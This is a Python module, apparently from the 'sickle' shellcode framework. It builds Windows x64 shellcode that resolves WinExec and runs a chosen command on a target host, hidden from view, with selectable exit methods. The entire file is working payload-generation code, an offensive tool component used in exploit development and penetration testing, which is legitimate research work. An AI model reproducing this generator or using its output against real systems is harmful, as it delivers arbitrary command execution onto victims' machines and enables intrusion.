import sys
import ctypes
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) Execute Command"

    module = f"{platform}/{arch}/exec"

    example_run = f"{sys.argv[0]} -p {module} EXEC=calc.exe"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.17763 N/A Build 17763)"]

    summary = ("Executes a command on the target host")

    description = ("Executes a command on the target host")

    arguments = {}
    arguments["EXEC"] = {}
    arguments["EXEC"]["optional"] = "no"
    arguments["EXEC"]["description"] = "Command to be executed"

    advanced = {}
    advanced["EXITFUNC"] = {}
    advanced["EXITFUNC"]["optional"] = "yes"
    advanced["EXITFUNC"]["description"] = "Exit technique"
    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
                                        "func": "Have the shellcode operate as function",
                                        "thread": "Exit as a thread",
                                        "process": "Exit as a process" }

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "WinExec",
            ],
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({"lpCommandLine" : self.cmd_len })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """

        all_args = Shellcode.arguments
        all_args.update(Shellcode.advanced)
        argv_dict = modparser.argument_check(all_args, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        # Set the command that will be executed by the shellcode. We must ensure
        # to NULL terminate it.
        self.cmd = argv_dict["EXEC"]

        self.cmd += "\x00"
        while (len(self.cmd) % 8) != 0:
            self.cmd += "\x00"

        # Document the size of the shell environment
        self.cmd_len = len(self.cmd)

        # Set the EXITFUNC and update the necessary dependencies
        self.exit_func = ""
        if "EXITFUNC" not in argv_dict.keys():
            self.exit_func = "terminate"
        else:
            self.exit_func = argv_dict["EXITFUNC"] 

        if self.exit_func == "terminate":
            self.dependencies["Kernel32.dll"] += "TerminateProcess",
        elif self.exit_func == "thread":
            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
            self.dependencies["Kernel32.dll"] += "LoadLibraryA",
        elif self.exit_func == "process":
            self.dependencies["Kernel32.dll"] += "ExitProcess",

        return 0

    def gen_main(self):
        """Returns assembly source code for the main functionality of the stub
        """

        src = f"""
; RAX => WinExec([in] LPCSTR lpCmdLine, // RCX => "command"
;                [in] UINT   uCmdShow); // RDX => SW_HIDE
call_WinExec:\n"""

        cmd_buffer = convert.from_str_to_xwords(self.cmd)
        write_index = self.storage_offsets['lpCommandLine']

        for i in range(len(cmd_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', cmd_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(cmd_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', cmd_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(cmd_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', cmd_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(cmd_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(cmd_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""    xor rdx, rdx
    mov [rbp - {write_index}], dl
    lea rcx, [rbp - {self.storage_offsets['lpCommandLine']}]
    mov rax, [rbp - {self.storage_offsets['WinExec']}]
    call rax\n"""

        return src

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    self.exit_func)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
